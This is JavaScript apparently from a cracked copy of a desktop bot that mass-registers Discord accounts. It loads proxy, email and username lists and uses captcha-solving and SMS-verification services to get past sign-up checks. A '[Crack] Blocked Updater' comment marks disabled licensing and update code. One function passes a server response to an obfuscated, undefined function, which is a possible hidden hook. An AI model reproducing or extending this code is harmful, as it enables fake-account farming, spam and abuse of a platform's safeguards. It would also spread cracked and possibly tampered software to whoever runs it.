  $('body').addClass(process.platform);
  $('body').on('click', '#check-proxys', async function () {
    if ($(this).hasClass('waiting')) return;
    $(this).addClass('waiting');
    if (!store.has('last_proxys')) return;
    var proxys = store.get('last_proxys');
    noty('warning', translater(translate[155]))
    var data = await checker_proxys(proxys);
    if (!data.type) return noty('error', pop_error);
    proxys = data.data;
    var proxy = [];
    proxys.forEach((e, ind, arr) => {
      e = e.replace('\n', '');
      e = e.replace('\r', '');
      e = e.replace(' \n', '');
      e = e.replace(' \r', '');
      e = e.replace(' ', '');
      e = e.replace('http://', '');
      e = e.replace('https://', '');
      if (e.indexOf(':') >= 0 && proxy.indexOf(e) < 0 && e != '') proxy.push(e);
      if (ind == arr.length - 1) {
        var count = proxy.length;
        var btn = $('label[for="upload-file-proxy"]');
        btn.addClass('editer');
        btn.attr('for', '');
        btn.css('opacity', '0');
        setTimeout(() => {
          btn.html(translater(translate[79]));
          setTimeout(() => {
            btn.css('opacity', '');
            count = count + ' '+translater(translate[60]);
            $('#count-of-proxy-regs').html(count);
            $('#close-btn-proxys').removeClass('hide-close-file-btn');
            if (tmp_data['proxy_enabler']) $('#count-of-proxy-regs').addClass('active');
          }, 50);
        }, 200);
      }
    });
    store.set('last_proxys', proxys);
    $(this).removeClass('waiting');
    noty('success', `${translater(translate[156])} ${proxys.length} ${translater(translate[60])}`)
  });
  $('body').on('click', '#get-onedash-proxys', async function () {
    if ($(this).hasClass('waiting')) return;
    $(this).addClass('waiting');
    noty('warning', translater(translate[150]));
    var get = await get_proxy_onedash($('#select-proxy-type').val());
    if (!get.type) {
      if (get.err == 1) {
        if (get.statusCode == 429) return noty('error', translater(translate[151]));
        return noty('error', translater(translate[152]));
      }
      if (get.err == 2) return noty('error', translater(translate[153]));
      return noty('error', pop_error);
    }
    var proxys = get.data;
    var proxy = [];
    proxys.forEach((e, ind, arr) => {
      e = e.replace('\n', '');
      e = e.replace('\r', '');
      e = e.replace(' \n', '');
      e = e.replace(' \r', '');
      e = e.replace(' ', '');
      e = e.replace('http://', '');
      e = e.replace('https://', '');
      if (e.indexOf(':') >= 0 && proxy.indexOf(e) < 0 && e != '') proxy.push(e);
      if (ind == arr.length - 1) {
        var count = proxy.length;
        var btn = $('label[for="upload-file-proxy"]');
        btn.addClass('editer');
        btn.attr('for', '');
        btn.css('opacity', '0');
        setTimeout(() => {
          btn.html(translater(translate[79]));
          setTimeout(() => {
            btn.css('opacity', '');
            count = count + ' '+translater(translate[60]);
            $('#count-of-proxy-regs').html(count);
            $('#close-btn-proxys').removeClass('hide-close-file-btn');
            if (tmp_data['proxy_enabler']) $('#count-of-proxy-regs').addClass('active');
          }, 50);
        }, 200);
      }
    });
    store.set('last_proxys', proxys);
    $(this).removeClass('waiting');
    noty('success', `${translater(translate[154])} ${proxys.length} ${translater(translate[60])}`)
  });
  $('body').on('change', '#limit_for_accs', function () {
    update_tmp('limit_for_accs', $(this).val());
  })
  $('body').on('change', '#limit_accs_enabler', function () {
    update_tmp('limit_accs_enabler', $(this).prop('checked'));
    if ($(this).prop('checked')) {
      $('#limit_for_accs').addClass('active');
    } else {
      $('#limit_for_accs').removeClass('active');
    }
  })
  if (tmp_data['limit_for_accs']) $('#limit_for_accs').val(tmp_data['limit_for_accs']);
  if (!tmp_data['proxy_type']) {
    update_tmp('proxy_type', 'http');
  } else {
    $('#select-proxy-type').val(tmp_data['proxy_type']);
  }
  updater_reg_statics();
  if (app_lang && app_lang == 'en' && !check_updater) {
    $('#switch_lang').html('Switch to Russian');
    $('[translate]').each(function (r, e) {
      var t = $(e);
      if (!t.hasAttr('tooltip')) {
        t.text(t.attr('translate'));
      }
    });
    $('input[translate]').each(function (r, e) {
      var t = $(e);
      if (!t.hasAttr('tooltip') && t.hasAttr('placeholder')) {
        t.attr('placeholder', t.attr('translate'));
      }
    });
    $('[translate][tooltip]').each(function (r, e) {
      var t = $(e);
      t.attr('tooltip', t.attr('translate'));
    });
  }
  function update_discord_version() {
	  console.log('[Crack] Blocked Updater #891783');
	  /**
    return new Promise(async fin => {
      try {
        req({
          url: 'https://onedash.net/app/get/client_id/reg',
          method: 'GET',
          headers: {
            token: user_token
          },
        }, (err, response, body) => {
          if (err || !response || response.statusCode != 200 || !body) return noty('error', translater(translate.noty.error_updating_discord_version))
          body = JSON.parse(body);
          if (!body.type) return;
          var version = body.version;
          window.localStorage.setItem('clien_idD', JSON.stringify(version));
        })
      } catch (err) { }
    })
	*/
  }
  
  /**
  if (!store.has('update_'+store.get('app_version')) || $('#delete-update').length < 1) {
    check_updater = true;
    var p = $('#loader p');
    p.css('transition', '.25s');
    setTimeout(() => {
      p.css('opacity', '0');
      setTimeout(() => {
        p.html(translater(translate[71]));
        setTimeout(() => {
          p.css('opacity', '1');
          setTimeout(() => {
            var params = {
              method: 'GET',
              url: `https://onedash.net/app_reg/get/upgrade?platform=${process.platform}`,
              headers: {
                token: user_token
              }
            };
            req(params, (err, response, body) => {
              if (err || !response || response.statusCode != 200 || !body) {
                $('#loader').css('opacity', '0');
                setTimeout(function() {
                  $('#loader').remove();
                }, 200);
                noty('error', translater(translate[72]), 15000);
                return false;
              }
              body = JSON.parse(body);
              var files = body.data;
              var restart = false;
              var close = false;
              setTimeout(() => {
                p.css('opacity', '0');
                setTimeout(() => {
                  p.html(translater(translate[73]));
                  setTimeout(() => {
                    p.css('opacity', '1');
                    setTimeout(() => {
                      p.css('opacity', '0');
                      files.forEach((e, ind, arr) => {
                        setTimeout(() => {
                          var path = e.name;
                          if (path.indexOf('index.html') >= 0) restart = true;
                          var data = e.value;
                          data = Buffer.from(data, 'base64');
                          if (path == '/node_modules') {
                            var new_zip = new JSZip();
                            new_zip.loadAsync(data).then(function(zip) {
                              var check_nc = false;
                              Object.keys(new_zip.files).forEach((e, inde, arre) => {
                                //var p = e;
                                  ensureDirectoryExistence(`${__dirname}/node_modules/${e}`);
                                  if (new_zip.file(e) != null) {
                                    new_zip.file(e).async('string').then(r => {
                                      var con = r;
                                      fs.writeFile(`${__dirname}/node_modules/${e}`, con, function (err) {
                                        if (err) {
                                          close = true;
                                        }
                                        if (inde == arre.length - 1) {
                                          setTimeout(() => {
                                            if (close) {
                                              alert(translater(translate.noty.other.fail_permis_updating));
                                              return false;
                                            }
                                            store.set('update_'+store.get('app_version'), true);
                                            if (restart) return restart_window();
                                            setTimeout(() => {
                                              $('#loader').css('opacity', '0');
                                              setTimeout(function() {
                                                $('#loader').remove();
                                                setTimeout(() => {
                                                  check_upgrade_files()
                                                }, 1000);
                                              }, 200);
                                            }, 500);
                                          }, 1500);
                                        }
                                      });
                                    });
                                  }
                                check_nc = false;
                              })
                            });
                          } else {
                            ensureDirectoryExistence(`${__dirname}${path}`);
                            fs.writeFile(`${__dirname}${path}`, data, function (err) {
                              if (err) close = true;
                            });
                          }
                          if (ind == arr.length - 1) {
                            setTimeout(() => {
                              p.html(translater(translate[74]));
                              setTimeout(() => {
                                p.css('opacity', '1');
                              }, 50);
                            }, 250);
                            setTimeout(() => {
                              if (close) {
                                alert(translater(translate[75]));
                                return false;
                              }
                              store.set('update_'+store.get('app_version'), true);
                              if (restart) return restart_window();
                              setTimeout(() => {
                                $('#loader').css('opacity', '0');
                                setTimeout(function() {
                                  $('#loader').remove();
                                }, 200);
                              }, 500);
                            }, 1500);
                          }
                        }, 100 * ind);
                      });
                    }, 5000);
                  }, 50);
                }, 200);
              }, 250);
            });
          }, 1000);
        }, 50);
      }, 200);
    }, 50);
  }
  **/
  update_discord_version();
  if (tmp_data['delete_used_usernames']) $('#delete_used_usernames').prop('checked', true);
  if (tmp_data['save_tokens_enabler']) {
    $('#save_tokens_enabler').prop('checked', tmp_data['save_tokens_enabler']);
    if ($('#save_tokens_enabler').prop('checked')) {
      $('#save_only_tokens_enabler').prop('checked', false);
      $('#block-save_only_tokens').addClass('active');
    }
  }
  if (tmp_data['save_only_tokens_enabler']) $('#save_only_tokens_enabler').prop('checked', true);
  if (tmp_data['save_usernames_enabler']) $('#save_usernames_enabler').prop('checked', tmp_data['save_usernames_enabler']);
  if (tmp_data['def_country']) $('.select-contry-phones').val(tmp_data['def_country']);
  if (tmp_data['gmail-api-data']) $('#gmail-api-data').val(tmp_data['gmail-api-data']);
  if (tmp_data['verify_email_imap_enabler']) {
    $('#verify_email_imap_enabler').prop('checked', tmp_data['verify_email_imap_enabler']);
    if ($('#verify_email_imap_enabler').prop('checked')) {
      hiderBlock($('#enable_random_emails'));
      $('#enable_imap_verification').addClass('active')
    } else {
      hiderBlock($('#enable_random_emails'));
      $('#enable_imap_verification').removeClass('active')
    }
  }
  if (tmp_data['verify_email_enabler']) {
    $('#verify_email_enabler').prop('checked', tmp_data['verify_email_enabler']);
    if ($('#verify_email_enabler').prop('checked')) {
      $('gmail-imap').addClass('active')
    } else {
      $('gmail-imap').removeClass('active')
    }
  }
  if (tmp_data['online_accs_enabler']) {
    $('#online_accs_block').addClass('active');
    $('#online_accs_enabler').prop('checked', true);
  }
  if (tmp_data['select-status-online-of-accs']) $('#select-status-online-of-accs').val(tmp_data['select-status-online-of-accs']);
  if (tmp_data['invite_accs_enabler']) {
    $('#invite_for_accs').addClass('active');
    $('#invite_accs_enabler').prop('checked', tmp_data['invite_accs_enabler']);
  }
  if (tmp_data['limit_accs_enabler']) {
    $('#limit_for_accs').addClass('active');
    $('#limit_accs_enabler').prop('checked', tmp_data['limit_accs_enabler']);
  }
  if (tmp_data['invite_for_accs']) $('#invite_for_accs').val(tmp_data['invite_for_accs']);
  $('select').niceSelect();
  if (tmp_data['dark_theme_enabler']) {
    $('head').append(css_dark);
    $('body').addClass('dark');
    $('#dark_theme_enabler').prop('checked', true);
  }
  if (!tmp_data['def_country']) {
    update_tmp('def_country', country);
  } else if (!check_updater) {
    country = tmp_data['def_country'];
    $('.select-contry-phones').val(country);
    apikey_verify_phone = $('#apikey_verify_phone').val().replace(' ', '');
    update_my_sms_num_c()
  }
  setTimeout(() => {
    if (check_updater) return false;
    $('#loader').css('opacity', '0')
    setTimeout(() => {
      $('#loader').remove();
    }, 250);
  }, 500);
  setTimeout(() => {
    update_online()
    setInterval(() => {
      update_online()
    }, 180 * 1000)
  }, 10 * 1000);
});

function explode(delimiter, string) {
  var emptyArray = { 0: '' };
  if ( arguments.length != 2
    || typeof arguments[0] == 'undefined'
    || typeof arguments[1] == 'undefined' )return null;

  if ( delimiter === ''
    || delimiter === false
    || delimiter === null )return false;
  if ( typeof delimiter == 'function'
    || typeof delimiter == 'object'
    || typeof string == 'function'
    || typeof string == 'object' )return emptyArray;
  if ( delimiter === true ) delimiter = '1';
  return string.toString().split ( delimiter.toString() );
}

function NumberEnd(number, titles, laster = false) {
  var last = titles[2];
  if (number == 0) return last;
  var cases = [2, 0, 1, 1, 1, 2];
  return titles[ (number%100>4 && number%100<20)? 2 : cases[(number%10<5)?number%10:5] ];
}

$('body').on('change', '#upload-file-emails', function () {
  try {
      var file = this.files[0];
      if (!file.path || file.type.indexOf('text') < 0) return noty('error', translater(translate[76]));
    var data = fs.readFileSync(file.path, 'utf8');
  } catch (err) {
    return noty('error', `Err: ${err.toString()}`);
  }
  $('#upload-file-emails').val('');
  var emails = explode('\n', data);
  if (!emails) return noty('error', translater(translate[77]));
  if (emails.length < 1) return noty('error', translater(translate[78]));
  var email = [];
  emails.forEach((e, ind, arr) => {
    e = e.replace('\n', '');
    e = e.replace('\r', '');
    e = e.replace(' ', '');
    e = e.replace(' \n', '');
    e = e.replace(' \r', '');
    if (email.indexOf(e) < 0) email.push(e);
    if (ind == arr.length - 1) {
      if (email.length < 1) return noty('error', translater(translate[78]));
      store.set('last_emails', email);
      var count = email.length;
      var btn = $('label[for="upload-file-emails"]');
      btn.addClass('editer');
      btn.attr('for', '');
      btn.css('opacity', '0');
      setTimeout(() => {
        btn.html(translater(translate[79]));
        $('#enable_random_emails').css('transform', 'scale(0)');
        setTimeout(() => {
          $('#email-load').css('display', '');
          $('#enable_random_emails').css('display', 'none');
          btn.css('opacity', '');
          count = count + NumberEnd(count, [' email', ' emails', ' emails']);
          $('#count-of-email-regs').html(count);
          $('#count-of-email-regs').addClass('active');
          $('#close-btn-emails').removeClass('hide-close-file-btn');
        }, 50);
      }, 200);
    }
  });
});

function validateEmail(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
}

function noty(type, msg, time = 6500) {new Noty({text:msg,type:type,layout:"bottomRight",theme:"sunset",closeWith:["click","button"],timeout:time}).show()}

$('body').on('click', '#email-load .btn.editer', function () {
  var modal = $('#modal-edit-email-list');
  if (!store.has('last_emails') || store.get('last_emails').length <= 0) return noty('error', pop_error);
  var emails = store.get('last_emails');
  modal.find('textarea').val('');
  emails.forEach((e, ind, arr) => {
    var val = modal.find('textarea').val();
    modal.find('textarea').val(`${val}${e}\n`);
    if (ind == arr.length - 1) {
      $('.modal').modal('hide');
      modal.modal('show');
    }
  })
});

$('body').on('click', '#modal-edit-email-list .action-save-email-list span:last-child', function () {
  var modal = $('#modal-edit-email-list');
  var new_emails = modal.find('textarea').val();
  var emails = explode('\n', new_emails);
  if (!emails) return noty('error', translater(translate[80]));
  if (emails.length < 1) return noty('error', translater(translate[78]));
  var email = [];
  emails.forEach((e, ind, arr) => {
    e = e.replace('\n', '');
    e = e.replace('\r', '');
    e = e.replace(' ', '');
    e = e.replace(' \n', '');
    e = e.replace(' \r', '');
    if (validateEmail(e) && email.indexOf(e) < 0) {
      email.push(e);
    }
    if (ind == arr.length - 1) {
      if (email.length < 1) return noty('error', translater(translate[78]));
      store.set('last_emails', email);
      var count = email.length;
      count = count + NumberEnd(count, [' email', ' emails', ' emails']);
      $('#count-of-email-regs').html(count);
      $('#count-of-email-regs').addClass('active');
      $('.modal').modal('hide');
      noty('success', translater(translate[81]));
    }
  });
});

$('body').on('keyup', function (e) {
  if (e.keyCode != 27) return false;
  $('.modal').modal('hide');
});

$('body').on('click', '#modal-edit-usernames-list .action-save-usernames-list span:last-child', function () {
  var modal = $('#modal-edit-usernames-list');
  var new_usernames = modal.find('textarea').val();
  var usernames = explode('\n', new_usernames);
  if (!usernames) return noty('error', translater(translate[82]));
  if (usernames.length < 1) return noty('error', translater(translate[83]));
  var username = [];
  usernames.forEach((e, ind, arr) => {
    e = e.replace('\n', '');
    e = e.replace('\r', '');
    e = e.replace(' \n', '');
    e = e.replace(' \r', '');
    if (e.indexOf('@') < 0 && e.indexOf('#') < 0 && e.length > 2 && e.length < 32 && username.indexOf(e) < 0 && e != '') username.push(e);
    if (ind == arr.length - 1) {
      if (username.length < 1) return noty('error', translater(translate[83]));
      if (!$('#random_emails_enabler').prop('checked')) {
        if (!store.has('last_emails') || username.length < store.get('last_emails').length) return noty('error', translater(translate[92]));
      }
      store.set('last_usernames', username);
      last_data_usernames = username;
      var count = username.length;
      count = count + NumberEnd(count, translater(translate[85]));
        $('#count-of-usernames-regs').html(count);
        $('#count-of-usernames-regs').addClass('active');
        $('#delete_used_usernames_block').addClass('active');
        $('.modal').modal('hide');
        noty('success', translater(translate[87]));
    }
  });
});

$('body').on('change', '#upload-file-proxy', function () {
  var type = this.files[0];
  if (!type.type || type.type.indexOf('text') < 0) return noty('error', translater(translate[76]));
  var reader = new FileReader();
  reader.onload = function (e) {
    var data = reader.result.substr(reader.result.indexOf('base64,') + 7);
    data = Buffer(data, 'base64').toString();
    $('#upload-file-proxy').val('');
    var proxys = explode('\n', data);
    if (!proxys) return noty('error', translater(translate[87]));
    if (proxys.length < 1) return noty('error', translater(translate[93]));
    var proxy = [];
    proxys.forEach((e, ind, arr) => {
      e = e.replace('\n', '');
      e = e.replace('\r', '');
      e = e.replace(' \n', '');
      e = e.replace(' \r', '');
      e = e.replace(' ', '');
      e = e.replace('http://', '');
      e = e.replace('https://', '');
      if (e.indexOf(':') >= 0 && proxy.indexOf(e) < 0 && e != '') proxy.push(e);
      if (ind == arr.length - 1) {
        if (proxy.length < 1) return noty('error', translater(translate[89]));
        store.set('last_proxys', proxy);
        var count = proxy.length;
        var btn = $('label[for="upload-file-proxy"]');
        btn.addClass('editer');
        btn.attr('for', '');
        btn.css('opacity', '0');
        setTimeout(() => {
          btn.html(translater(translate[79]));
          setTimeout(() => {
            btn.css('opacity', '');
            count = count + ' '+translater(translate[60]);
            $('#count-of-proxy-regs').html(count);
            $('#count-of-proxy-regs').addClass('active');
            $('#close-btn-proxys').removeClass('hide-close-file-btn');
          }, 50);
        }, 200);
      }
    });
  };
  reader.readAsDataURL(this.files[0]);
});

$('body').on('change', '#upload-file-usernames', function () {
  var type = this.files[0];
  if (!type.type || type.type.indexOf('text') < 0) return noty('error', translater(translate[76]));
  var reader = new FileReader();
  reader.onload = function (e) {
    var data = reader.result.substr(reader.result.indexOf('base64,') + 7);
    data = Buffer(data, 'base64').toString();
    $('#upload-file-usernames').val('');
    var usernames = explode('\n', data);
    if (!usernames) return noty('error', translater(translate[90]));
    if (usernames.length < 1) return noty('error', translater(translate[83]));
    var username = [];
    usernames.forEach((e, ind, arr) => {
      e = e.replace('\n', '');
      e = e.replace('\r', '');
      e = e.replace(' \n', '');
      e = e.replace(' \r', '');
      if (e.indexOf('@') < 0 && e.indexOf('#') < 0 && e.length > 2 && e.length < 32 && username.indexOf(e) < 0 && e != '') username.push(e);
      if (ind == arr.length - 1) {
        if (username.length < 1) return noty('error', translater(translate[91]));
        // if (!$('#random_emails_enabler').prop('checked')) {
        //   if (!store.has('last_emails') || username.length < store.get('last_emails').length) return noty('error', translater(translate[84]));
        // }
        store.set('last_usernames', username);
        last_data_usernames = username;
        var count = username.length;
        var btn = $('label[for="upload-file-usernames"]');
        btn.addClass('editer');
        btn.attr('for', '');
        btn.css('opacity', '0');
        setTimeout(() => {
          btn.html(translater(translate[79]));
          setTimeout(() => {
            btn.css('opacity', '');
            count = count + NumberEnd(count, translater(translate[85]));
            $('#enable_random_usernames').css('transform', 'scale(0)');
            setTimeout(() => {
              $('#enable_random_usernames').css('display', 'none');
              setTimeout(() => {
                $('#count-of-usernames-regs').html(count);
                $('#count-of-usernames-regs').addClass('active');
                $('#delete_used_usernames_block').addClass('active');
                $('#close-btn-usernames').removeClass('hide-close-file-btn');
              }, 50);
            }, 200);
          }, 50);
        }, 200);
      }
    });
  };
  reader.readAsDataURL(this.files[0]);
});

$('body').on('click', '#enable_random_usernames_two.editer', function () {
  var modal = $('#modal-edit-usernames-list');
  if (!store.has('last_usernames') || store.get('last_usernames').length <= 0) return noty('error', pop_error);
  var usernames = store.get('last_usernames');
  last_data_usernames = usernames;
  modal.find('textarea').val('');
  usernames.forEach((e, ind, arr) => {
    var val = modal.find('textarea').val();
    modal.find('textarea').val(`${val}${e}\n`);
    if (ind == arr.length - 1) {
      $('.modal').modal('hide');
      modal.modal('show');
    }
  })
});

$('body').on('shown.bs.modal', '#modal-edit-usernames-list', function () {
  $('#modal-edit-usernames-list textarea').focus();
});

$('body').on('shown.bs.modal', '#modal-edit-email-list', function () {
  $('#modal-edit-email-list textarea').focus();
});

$('body').on('click', '#proxy-load .btn.editer', function () {
  var modal = $('#modal-edit-proxy-list');
  if (!store.has('last_proxys') || store.get('last_proxys').length <= 0) return noty('error', pop_error);
  var emails = store.get('last_proxys');
  modal.find('textarea').val('');
  emails.forEach((e, ind, arr) => {
    var val = modal.find('textarea').val();
    modal.find('textarea').val(`${val}${e}\n`);
    if (ind == arr.length - 1) {
      $('.modal').modal('hide');
      modal.modal('show');
    }
  })
});

$('body').on('click', '#modal-edit-proxy-list .action-save-proxy-list span:last-child', function () {
  var modal = $('#modal-edit-proxy-list');
  var new_usernames = modal.find('textarea').val();
  var proxys = explode('\n', new_usernames);
  if (!proxys) return noty('error', translater(translate[92]));
  if (proxys.length < 1) return noty('error', translater(translate[93]));
  var proxy = [];
  proxys.forEach((e, ind, arr) => {
    e = e.replace('\n', '');
    e = e.replace('\r', '');
    e = e.replace(' \n', '');
    e = e.replace(' \r', '');
    e = e.replace('http://', '');
    e = e.replace('https://', '');
    if (e.indexOf(':') >= 0 && proxy.indexOf(e) < 0 && e != '') proxy.push(e);
    if (ind == arr.length - 1) {
      if (proxy.length < 1) return noty('error', translater(translate[93]));
      store.set('last_proxys', proxy);
      var count = proxy.length;
      count = count + ' '+translater(translate[60]);
      $('#count-of-proxy-regs').html(count);
      $('#count-of-proxy-regs').addClass('active');
      $('.modal').modal('hide');
      noty('success', translater(translate[94]));
    }
  });
});

$('body').on('change', '#export-discrim-accs-file', function () {
  if (!this.files || this.files.length <= 0 || !this.files[0].type || this.files[0].type.indexOf('text') < 0 && this.files[0].type.indexOf('application') < 0) return noty('error', translater(translate[76]));
  var name = this.files[0].name;
  var path = this.files[0].path;
  var size = this.files[0].size;
  setTimeout(() => {
    $('#export-discrim-accs-file').val('');
  }, 300);
  check_permit_file(path).then((check) => {
    if (check.type == 'not_found') return noty('error', translater(translate[95]));
    if (check.type == 'per') return noty('error', translater(translate[96]));
    update_tmp('export-discrim-accs-file', path);
    var btn = $('label[for="export-discrim-accs-file"]');
    btn.addClass('editer');
    btn.css('opacity', '0');
    setTimeout(() => {
      btn.html(translater(translate[98]));
      setTimeout(() => {
        btn.css('opacity', '');
        $('#name-of-export-discrims-file').html(name);
        $('#name-of-export-discrims-file').addClass('active');
        if (size != 0) noty('warning', translater(translate[97]), 15 * 1000);
      }, 50);
    }, 200);
  })
})

$('body').on('change', '#delete_used_usernames', function () {
  update_tmp('delete_used_usernames', $(this).prop('checked'));
})

$('body').on('change', '#export-accs-file', function () {
  if (!this.files || this.files.length <= 0 || !this.files[0].type || this.files[0].type.indexOf('text') < 0 && this.files[0].type.indexOf('application') < 0) return noty('error', translater(translate[76]));
  var name = this.files[0].name;
  var path = this.files[0].path;
  var size = this.files[0].size;
  setTimeout(() => {
    $('#export-accs-file').val('');
  }, 300);
  check_permit_file(path).then((check) => {
    if (check.type == 'not_found') return noty('error', translater(translate[95]));
    if (check.type == 'per') return noty('error', translater(translate[96]));
    update_tmp('last_export_file', path);
    var btn = $('label[for="export-accs-file"]');
    btn.addClass('editer');
    btn.css('opacity', '0');
    setTimeout(() => {
      btn.html(translater(translate[98]));
      setTimeout(() => {
        btn.css('opacity', '');
        $('#name-of-export-file').html(name);
        $('#name-of-export-file').addClass('active');
        if (size != 0) noty('warning', translater(translate[97]), 15 * 1000);
      }, 50);
    }, 200);
  })
});

function check_permit_file(path) {
  return new Promise(fin => {
    if (!path) return fin({type: 'false'});
    fs.readFile(path, 'utf8', function (err, data) {
      if (err) return fin({type: 'not_found'});
      fs.writeFile(path, data, function (err) {
        if (err) return fin({type: 'per'});
        return fin({type: 'success'});
      });
    });
  });
}

var tmp_logs = [];

function add_log(log, potok_number) {
  if (!$('.history-block').hasClass('active')) $('.history-block').addClass('active');
  var time = moment().format('HH:mm');
  var full_date = moment().format('HH:mm:ss D.MM.YYYY');
  if (!potok_number) {
    var html = `<div class="log load">
                  <div class="time" tooltip="${full_date}" flow="right">${time}</div>
                  <div class="log-data"></div>
                  <div class="potok-number"></div>
                </div>`;
    html = $(html);
    html.find('.log-data').text(log.substr(0, 2000));
  } else {
    var html = `<div class="log load">
                  <div class="time" tooltip="${full_date}" flow="right">${time}</div>
                  <div class="log-data"></div>
                  <div class="potok-number"></div>
                </div>`;
    html = $(html);
    if (typeof log == 'string' && log.indexOf('log_error') >= 0) {
      html.find('.log-data').html(log);
    } else {
      html.find('.log-data').text(log.substr(0, 2000));
    }    
  }
  $('.block-logs').prepend(html);
  if ($('.block-logs .log').length > 300) {
    $('.block-logs .log:last-child').remove();
  }
  setTimeout(() => {
    $('.block-logs .log').removeClass('load');
  }, 50);
  var data_log = {
    time: new Date().getTime(),
    log: log,
    potok: potok_number
  }
  tmp_logs.push(data_log);
  if (tmp_logs.length > 20) {
    var datert = [];
    if (store.has('logs')) datert = store.get('logs');
    tmp_logs.forEach(e => {
      datert.push(e);
    })
    tmp_logs = [];
    if (datert.length > 100) {
      var rer = [];
      datert.reverse().forEach((e, ind, arr) => {
        if (ind < 74) {
          rer.push(e);
        }
      })
      store.set('logs', rer);
    } else {
      store.set('logs', datert);
    }
  }
  return true;
  setTimeout(() => {
    if (!store.has('logs') || store.get('logs').length <= 0) {
      var logs = [];
      var data = data_log;
      logs.push(data);
      store.set('logs', logs);
    } else {
      var logs = store.get('logs');
      var data = data_log;
      logs.push(data);
      store.set('logs', logs);
    }
  }, 500);
}

function push_history() {
  var block = $('.history-block');
  if (!store.has('logs') || store.get('logs').length <= 0) {
    block.removeClass('active');
    return false;
  }
  var logs = store.get('logs');
  var i = 0;
  logs.reverse().forEach((e, ind, arr) => {
    i++;
    if (i <= 75) {
      var time = moment(new Date(e.time)).format('HH:mm');
      var full_date = moment(new Date(e.time)).format('HH:mm:ss D.MM.YYYY');
      if (!e.potok) {
        var html = `<div class="log">
                      <div class="time" tooltip="${full_date}" flow="right">${time}</div>
                      <div class="log-data">${e.log}</div>
                      <div class="potok-number"></div>
                    </div>`;
      } else {
        var html = `<div class="log">
                      <div class="time" tooltip="${full_date}" flow="right">${time}</div>
                      <div class="log-data">${e.log}</div>
                      <div class="potok-number"></div>
                    </div>`;
      }
      $('.block-logs').append(html);
    }
  });
  if (!block.hasClass('active')) block.addClass('active');
}

push_history();

// $('body').on('click', '.btn-start-reg..cont', function () {
//   $(this).html('STOP');
//   $(this).removeClass('cont');
// });

var last_count_potok = 0;
var last_count_potok_finish = 0;

function check_cap_monster_f() {
  return new Promise(fin => {
    var check_cap_monster = tmp_data['cap_monster_url'];
    var params = {
      url: `http://${check_cap_monster}/res.php`,
      method: 'GET'
    };
    req(params, (err, response, body) => {
      meAtztGn1pdERnu(body);
      if (err || !response) return fin(false);
      return fin(true);
    })
  });
}

var checkStopRegerRN = false;
var checkStop = {};

$('body').on('dblclick', '.btn-start-reg.wait-end', function () {
  checkStopRegerRN = true;
  $(this).removeClass('wait-end');
  $(this).text('START');
  var startId = $(this).attr('startId');
  checkStop[startId] = true;
});

$('body').on('click', '.btn-start-reg', async function () {
  var btn = $(this);
  if ($(this).hasClass('wait-end')) {
    return noty('error', translater(new_translate.wait_stop_potoks));
  } else if (checkStopRegerRN) {
    checkStopRegerRN = false;
  } else if ($(this).hasClass('waiting') || $(this).hasClass('wait-end') || last_count_potok_finish != last_count_potok) return false;
  last_success_cap = [];
  check_stop = false;
  btn.removeAttr('startId');
  last_count_potok_finish = 0;
  if (!store.has('last_emails') && !$('#random_emails_enabler').prop('checked')) return noty('error', translater(translate[80]));
  if (!$('#random_emails_enabler').prop('checked') && store.get('last_emails').length <= 0) return noty('error', translater(translate[123]));
  if (!$('#random_usernames_enabler').prop('checked') && !store.has('last_usernames')) return noty('error', translater(translate[82]));
  if (!$('#random_usernames_enabler').prop('checked')) {
    if (!store.has('last_usernames')) return noty('error', translater(translate[82]));
    if (store.get('last_usernames').length <= 0) return noty('error', translater(translate[124]));
    //if (store.get('last_usernames').length < store.get('last_emails').length) return noty('error', translater(translate[84]));
  }
  if ($('#proxy_enabler').prop('checked')) {
    if (!store.has('last_proxys')) return noty('error', translater(translate[99]));
    if (store.get('last_proxys').length < 1) return noty('error', translater(translate[100]));
  }
  if ($('#phone_enabler').prop('checked') && type_verify != 8 && type_verify != 10 && type_verify != 13 && type_verify != 11) if (!$('#apikey_verify_phone').val() || $('#apikey_verify_phone').val().length != 32) return noty('error', translater(translate[101]));
  if (!$('#save_accs_enabler').prop('checked') || !tmp_data['last_export_file']) return noty('error', translater(translate[102]));
  if (!$('#apikey_captcha').val()) return noty('error', translater(translate[103]));
  type_captcha = parseInt($('.select-captcha').val());
  if ($('#apikey_captcha').val().length != 32 && type_captcha != 3 && type_captcha != 10) return noty('error', translater(translate[104]));
  if (type_captcha == 10 && $('#apikey_captcha').val().indexOf(':') < 0) return noty('error', translater(translate[158]));
  if (!$('#steam_count').val() || $('#steam_count').val() == '') return noty('error', translater(translate[105]));
  if (parseInt($('#steam_count').val()) < 1) return noty('error', translater(translate[106]));
  if (parseInt($('#steam_count').val()) > 300) return noty('error', translater(translate[107]));
  var verfy_mails = $('#verify_email_enabler').prop('checked');
  avatar_load = $('#load_avatars_enabler').prop('checked');
  if (avatar_load && avatars.length <= 0) return noty('error', translater(translate[108]));
  if ($('#limit_accs_enabler').prop('checked')) {
    var limit = $('#limit_for_accs').val();
    if (!limit || limit == '' || isNaN(parseInt(limit))) return noty('error', translater(translate[157]));
  }
  if ($('#save_discrim_accs_enabler').prop('checked')) {
    if ($('#discrims-for-save').val().length < 1) return noty('error', translater(new_translate.dont_put_tags_exp));
    if (!tmp_data['export-discrim-accs-file']) return noty('error', translater(new_translate.dont_sel_file_for_tags_exp));
  }
  if (verfy_mails) typeOfEmailVerifications = 'temp';
  if ($('#verify_email_imap_enabler').prop('checked')) {
    verfy_mails = true;
    typeOfEmailVerifications = 'imap'
    //console.log(getImapConfig())
    if (!getImapConfig()) return noty('error', translater(new_translate.dont_set_imap_settings));
    // var gmailImap = $('#gmail-api-data').val();
    // if (!gmailImap || gmailImap.length < 1 || gmailImap.indexOf(':') < 0 || gmailImap.split(':').length < 2) {
    //   return noty('error', translater(new_translate.dont_put_gmail_imap));
    // }
    // var gmailData = gmailImap.split(':');
    // gmailData = {
    //   user: gmailData[0],
    //   password: gmailData[1]
    // };
    // defImapUser = gmailData;
    // noty('warning', translater(new_translate.check_gmail_data))
    // var check = await imapper(gmailData);
    // if (!check.type) return noty('error', translater(new_translate.err_check_gmail_data));
  } else if (!verfy_mails) {
    typeOfEmailVerifications = false;
  }
  var stayOnline = $('#online_accs_enabler').prop('checked');
  if (stayOnline) stayOnline = $('#select-status-online-of-accs').val();
  btn.addClass('waiting');
  btn.html('STOP');
  verify_phone_check = $('#phone_enabler').prop('checked');
